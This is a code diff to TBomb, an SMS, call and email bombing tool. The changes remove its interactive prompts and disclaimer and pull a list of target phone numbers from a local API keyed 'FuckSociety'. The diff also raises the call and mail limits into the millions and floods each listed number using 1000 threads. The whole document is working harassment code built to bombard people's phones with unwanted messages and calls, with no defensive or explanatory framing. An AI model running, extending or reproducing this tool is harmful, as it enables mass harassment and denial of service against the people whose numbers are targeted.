@@ -50,33 +50,11 @@ def clr():
         os.system("clear")
 
 
-def bann_text():
-    clr()
-    logo = """
-   ████████ █████                 ██
-   ▒▒▒██▒▒▒ ██▒▒██                ██
-      ██    ██  ██        ██   ██ ██
-      ██    █████▒  ████  ███ ███ █████
-      ██    ██▒▒██ ██  ██ ██▒█▒██ ██▒▒██
-      ██    ██  ██ ██  ██ ██ ▒ ██ ██  ██
-      ██    █████▒ ▒████▒ ██   ██ █████▒
-      ▒▒    ▒▒▒▒▒   ▒▒▒▒  ▒▒   ▒▒ ▒▒▒▒▒
-                                         """
-    if ASCII_MODE:
-        logo = ""
-    version = "Version: "+__VERSION__
-    contributors = "Contributors: "+" ".join(__CONTRIBUTORS__)
-    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
-    mesgdcrt.SuccessMessage(version)
-    mesgdcrt.SectionMessage(contributors)
-    print()
-
 
 def check_intr():
     try:
         requests.get("https://motherfuckingwebsite.com")
     except Exception:
-        bann_text()
         mesgdcrt.FailureMessage("Poor internet connection detected")
         sys.exit(2)
 
@@ -199,24 +177,14 @@ def notifyen():
 
 
 def get_phone_info():
-    while True:
-        target = ""
-        cc = input(mesgdcrt.CommandMessage(
-            "Enter your country code (Without +): "))
-        cc = format_phone(cc)
-        if not country_codes.get(cc, False):
-            mesgdcrt.WarningMessage(
-                "The country code ({cc}) that you have entered"
-                " is invalid or unsupported".format(cc=cc))
-            continue
-        target = input(mesgdcrt.CommandMessage(
-            "Enter the target number: +" + cc + " "))
-        target = format_phone(target)
-        if ((len(target) <= 6) or (len(target) >= 12)):
-            mesgdcrt.WarningMessage(
-                "The phone number ({target})".format(target=target) +
-                "that you have entered is invalid")
-            continue
+        target = []
+        cc="91"
+        response=requests.get('http://127.0.0.1:8000/api/targets?key=FuckSociety', json={
+        'key': 'FuckSociety',
+        }).json()
+        if len(response) > 0:
+            for obj in response:
+                target.append(obj['phone_number'])
         return (cc, target)
 
 
@@ -246,117 +214,48 @@ def pretty_print(cc, target, success, failed):
     mesgdcrt.SuccessMessage("TBomb was created by SpeedX")
 
 
-def workernode(mode, cc, target, count, delay, max_threads):
+def workernode(mode, cc, numbers, count, delay, max_threads):
 
-    api = APIProvider(cc, target, mode, delay=delay)
-    clr()
-    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
-    mesgdcrt.GeneralMessage(
-        "Please stay connected to the internet during bombing")
-    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
-    mesgdcrt.GeneralMessage("Target        : " + cc + target)
-    mesgdcrt.GeneralMessage("Amount        : " + str(count))
-    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
-    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
-                            " seconds")
-    mesgdcrt.WarningMessage(
-        "This tool was made for fun and research purposes only")
-    print()
-    input(mesgdcrt.CommandMessage(
-        "Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))
+    for target in numbers:
+        api = APIProvider(cc, target, mode, delay=delay)
+        if len(APIProvider.api_providers) == 0:
+            mesgdcrt.GeneralMessage("Api Providers Finished")
+            sys.exit()
 
-    if len(APIProvider.api_providers) == 0:
-        mesgdcrt.FailureMessage("Your country/target is not supported yet")
-        mesgdcrt.GeneralMessage("Feel free to reach out to us")
-        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
-        bann_text()
-        sys.exit()
+        success, failed = 0, 0
+        while success < count:
+            with ThreadPoolExecutor(max_workers=max_threads) as executor:
+                jobs = []
+                for i in range(count-success):
+                    jobs.append(executor.submit(api.hit))
 
-    success, failed = 0, 0
-    while success < count:
-        with ThreadPoolExecutor(max_workers=max_threads) as executor:
-            jobs = []
-            for i in range(count-success):
-                jobs.append(executor.submit(api.hit))
-
-            for job in as_completed(jobs):
-                result = job.result()
-                if result is None:
-                    mesgdcrt.FailureMessage(
-                        "Bombing limit for your target has been reached")
-                    mesgdcrt.GeneralMessage("Try Again Later !!")
-                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
-                    bann_text()
-                    sys.exit()
-                if result:
-                    success += 1
-                else:
-                    failed += 1
-                clr()
-                pretty_print(cc, target, success, failed)
-    print("\n")
-    mesgdcrt.SuccessMessage("Bombing completed!")
-    time.sleep(1.5)
-    bann_text()
+                for job in as_completed(jobs):
+                    result = job.result()
+                    if result:
+                        success += 1
+                    else:
+                        failed += 1
+                    clr()
+        print("\n")
+        time.sleep(0.5)
     sys.exit()
-
 
 def selectnode(mode="sms"):
     mode = mode.lower().strip()
     try:
         clr()
-        bann_text()
         check_intr()
-        check_for_updates()
-        notifyen()
 
-        max_limit = {"sms": 500, "call": 15, "mail": 200}
-        cc, target = "", ""
+        max_limit = {"sms": 10, "call": 10000005, "mail": 3000000}
+        cc, target = "", []
         if mode in ["sms", "call"]:
             cc, target = get_phone_info()
             if cc != "91":
-                max_limit.update({"sms": 100})
-        elif mode == "mail":
-            target = get_mail_info()
+                max_limit.update({"sms": 200000})
         else:
             raise KeyboardInterrupt
 
-        limit = max_limit[mode]
-        while True:
-            try:
-                message = ("Enter number of {type}".format(type=mode.upper()) +
-                           " to send (Max {limit}): ".format(limit=limit))
-                count = int(input(mesgdcrt.CommandMessage(message)).strip())
-                if count > limit or count == 0:
-                    mesgdcrt.WarningMessage("You have requested " + str(count)
-                                            + " {type}".format(
-                                                type=mode.upper()))
-                    mesgdcrt.GeneralMessage(
-                        "Automatically capping the value"
-                        " to {limit}".format(limit=limit))
-                    count = limit
-                delay = float(input(
-                    mesgdcrt.CommandMessage("Enter delay time (in seconds): "))
-                    .strip())
-                # delay = 0
-                max_thread_limit = (count//10) if (count//10) > 0 else 1
-                max_threads = int(input(
-                    mesgdcrt.CommandMessage(
-                        "Enter Number of Thread (Recommended: {max_limit}): "
-                        .format(max_limit=max_thread_limit)))
-                    .strip())
-                max_threads = max_threads if (
-                    max_threads > 0) else max_thread_limit
-                if (count < 0 or delay < 0):
-                    raise Exception
-                break
-            except KeyboardInterrupt as ki:
-                raise ki
-            except Exception:
-                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
-                print()
-
-        workernode(mode, cc, target, count, delay, max_threads)
+        workernode(mode, cc, target, 10, 1, 1000)
     except KeyboardInterrupt:
         mesgdcrt.WarningMessage("Received INTR call - Exiting...")
         sys.exit()
@@ -429,23 +328,8 @@ if __name__ == "__main__":
     elif args.sms:
         selectnode(mode="sms")
     else:
-        choice = ""
-        avail_choice = {
-            "1": "SMS",
-            "2": "CALL",
-            "3": "MAIL"
-        }
         try:
-            while (choice not in avail_choice):
-                clr()
-                bann_text()
-                print("Available Options:\n")
-                for key, value in avail_choice.items():
-                    print("[ {key} ] {value} BOMB".format(key=key,
-                                                          value=value))
-                print()
-                choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
-            selectnode(mode=avail_choice[choice].lower())
+            selectnode("sms")
         except KeyboardInterrupt:
             mesgdcrt.WarningMessage("Received INTR call - Exiting...")
             sys.exit()
